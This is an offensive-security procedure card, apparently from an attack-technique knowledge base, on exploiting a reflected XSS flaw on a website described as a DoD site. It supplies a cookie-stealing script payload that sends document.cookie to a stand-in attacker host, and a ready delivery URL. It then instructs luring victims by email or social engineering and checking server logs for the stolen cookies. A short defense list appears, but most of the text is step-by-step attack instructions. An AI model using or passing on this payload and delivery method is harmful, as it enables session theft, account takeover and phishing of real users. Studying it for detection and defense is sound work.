---
id: proc-execute-xss-payload
tags:
  - xss
  - payload-execution
  - session-theft
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:30.812Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Execute XSS Payload via Crafted URL

## Summary

This procedure demonstrates how to craft and deliver a malicious URL exploiting a reflected XSS vulnerability on a DoD website, executing JavaScript to steal session cookies or modify page content in the victim's browser.

## Description

Once the vulnerable parameter is identified, attackers craft a URL embedding a JavaScript payload that runs when visited. Impacts include revealing session tokens for account takeover or injecting fake forms. This targets browsers on web platforms; success depends on tricking users into clicking the link, often via email or social engineering. Expected outcomes: arbitrary code execution in the victim's context.

## Requirements

1. Valid vulnerable URL from discovery phase
2. Attacker-controlled server for data exfiltration
3. URL shortening or obfuscation tools if needed

## Defense

Defensive measures and detection strategies:

- Deploy Web Application Firewall (WAF) rules to block script tags in parameters
- Educate users on phishing via crafted links
- Log and alert on unusual parameter lengths or encodings

## Objectives

1. Inject and execute JavaScript in victim browser
2. Exfiltrate sensitive data like cookies
3. Demonstrate content manipulation potential

## Instructions

### Step 1: Craft Malicious Payload

**Context**: Build a payload tailored to the vulnerability, focusing on session theft.

Use a script to capture and send cookies: `<script>fetch('http://attacker.com/steal?data='+document.cookie)</script>`.

Encode if necessary and append to the parameter.

> Test locally first to ensure execution without errors.

### Step 2: Deliver and Verify Execution

**Context**: Trick a user into visiting the URL and monitor for impact.

Share the crafted URL: `https://dod.example.gov/search?q=<script>fetch('http://attacker.com/steal?data='+document.cookie)</script>`.

Check attacker's server logs for incoming requests with cookie data.

> Success: Data received; failure: Payload blocked or not reflected.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[JavaScript]]
